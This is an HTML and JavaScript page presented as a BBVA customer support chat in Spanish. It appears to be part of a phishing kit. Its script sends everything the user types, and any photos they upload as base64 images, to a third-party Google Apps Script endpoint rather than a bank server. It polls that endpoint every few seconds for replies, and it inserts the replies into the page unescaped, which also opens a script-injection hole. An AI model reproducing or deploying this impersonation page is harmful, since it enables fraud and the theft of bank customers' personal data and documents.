<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Soporte - BBVA</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { 
            background: #041530; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }
        .chat-container { 
            height: calc(100vh - 140px); 
        }
        .glow-header {
            background: linear-gradient(145deg, rgba(10, 58, 118, 0.4) 0%, rgba(4, 21, 48, 0.6) 100%);
            box-shadow: 0 4px 30px rgba(20, 117, 217, 0.15);
            border-bottom: 1px solid rgba(20, 117, 217, 0.2);
            backdrop-filter: blur(10px);
        }
        .message-bubble { 
            max-width: 75%; 
            padding: 12px 16px; 
            border-radius: 18px; 
            font-size: 14px;
            line-height: 1.4;
        }
        .received { 
            background-color: rgba(7, 33, 70, 0.85); 
            border: 1px solid rgba(20, 117, 217, 0.25);
            border-bottom-left-radius: 4px; 
            color: #ffffff;
        }
        .sent { 
            background: linear-gradient(90deg, #0073ea 0%, #0056b3 100%);
            box-shadow: 0 4px 12px rgba(0, 115, 234, 0.3);
            border-bottom-right-radius: 4px; 
            color: #ffffff;
        }
        .premium-input {
            background-color: rgba(2, 11, 24, 0.6);
            border: 1px solid rgba(20, 117, 217, 0.4);
            transition: all 0.3s ease;
        }
        .premium-input:focus {
            border-color: #1475d9;
            box-shadow: 0 0 10px rgba(20, 117, 217, 0.5);
            outline: none;
        }
        .bbva-send-btn {
            background: linear-gradient(90deg, #0073ea 0%, #0056b3 100%);
            box-shadow: 0 4px 15px rgba(0, 115, 234, 0.4);
        }
        .bbva-send-btn:hover {
            background: linear-gradient(90deg, #0080ff 0%, #0066cc 100%);
        }
    </style>
</head>
<body class="text-white min-h-screen flex flex-col">

    <header class="flex items-center justify-between px-6 py-4 glow-header z-10">
        <a href="index.html" class="text-blue-400 hover:text-white flex items-center text-sm font-semibold transition">
            <i class="fa-solid fa-chevron-left mr-2"></i>Atrás
        </a>
        <div class="text-center">
            <p class="font-bold tracking-wider text-base text-white">Soporte BBVA</p>
            <p class="text-[10px] text-green-400 font-bold flex items-center justify-center gap-1.5 mt-0.5">
                <span class="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse"></span>En línea
            </p>
        </div>
        <div class="w-8"></div>
    </header>

    <div id="chatContainer" class="flex-1 p-4 overflow-y-auto space-y-4 chat-container bg-[#020b18]">
        </div>

    <div class="p-4 border-t border-blue-900/40 bg-[#041530]/90 backdrop-blur-md">
        <div class="flex gap-2.5">
            <input type="text" id="messageInput" placeholder="Escribe un mensaje..." 
                   class="flex-1 rounded-2xl px-5 py-3.5 text-white premium-input placeholder-gray-500 text-sm">
            <button onclick="sendMessage()" 
                    class="bbva-send-btn text-white px-6 rounded-2xl font-bold transition flex items-center justify-center">
                <i class="fa-solid fa-paper-plane"></i>
            </button>
        </div>
        <div class="text-center mt-3">
            <input type="file" id="photoUpload" accept="image/*" class="hidden" onchange="sendPhoto(this)">
            <button onclick="document.getElementById('photoUpload').click()" 
                    class="text-xs text-blue-400 hover:text-blue-300 font-semibold transition flex items-center justify-center mx-auto gap-1.5">
                <i class="fa-solid fa-camera"></i> Enviar Foto
            </button>
        </div>
    </div>

    <script>
        const API_URL = "https://script.google.com/macros/s/AKfycbzYds8gGtgIOA8QiCyyWaI-v3vEdX7_02siN7JEfHT7syAhVb_knK32PaIzTCM1iUdXqA/exec";
        const userId = localStorage.getItem("userId");

        if (!userId) {
            window.location.href = "index.html";
        }

        async function loadMessages() {
            const container = document.getElementById('chatContainer');
            try {
                const res = await fetch(`${API_URL}?action=getMessages&userId=${userId}`);
                const result = await res.json();

                if (result.status === "success") {
                    container.innerHTML = result.messages.map(msg => `
                        <div class="flex ${msg.sender === userId ? 'justify-end' : 'justify-start'}">
                            <div class="message-bubble ${msg.sender === userId ? 'sent' : 'received'} shadow-md">
                                ${msg.message}
                                <p class="text-[9px] mt-1 opacity-60 text-right">${msg.timestamp}</p>
                            </div>
                        </div>
                    `).join('');
                    container.scrollTop = container.scrollHeight;
                }
            } catch (e) {
                container.innerHTML = '<div class="text-center text-red-400 py-8 text-xs">Error al cargar los mensajes</div>';
            }
        }

        async function sendMessage() {
            const input = document.getElementById('messageInput');
            const text = input.value.trim();
            if (!text) return;

            try {
                await fetch(API_URL, {
                    method: "POST",
                    headers: { "Content-Type": "text/plain" },
                    body: JSON.stringify({
                        action: "submitMessage",
                        senderId: userId,
                        message: text
                    })
                });
                input.value = '';
                loadMessages();
            } catch (e) {
                alert("Error al enviar el mensaje");
            }
        }

        async function sendPhoto(input) {
            if (!input.files[0]) return;
            const file = input.files[0];
            const reader = new FileReader();
            
            reader.onload = async function(e) {
                const base64 = e.target.result;
                try {
                    await fetch(API_URL, {
                        method: "POST",
                        headers: { "Content-Type": "text/plain" },
                        body: JSON.stringify({
                            action: "submitMessage",
                            senderId: userId,
                            message: `<img src="${base64}" class="max-w-[200px] rounded-xl border border-blue-900/40 shadow-lg">`
                        })
                    });
                    loadMessages();
                } catch (e) {
                    alert("Error al enviar la foto");
                }
            };
            reader.readAsDataURL(file);
        }

        // Load messages on start and refresh every 4 seconds
        loadMessages();
        setInterval(loadMessages, 4000);
    </script>
</body>
</html>
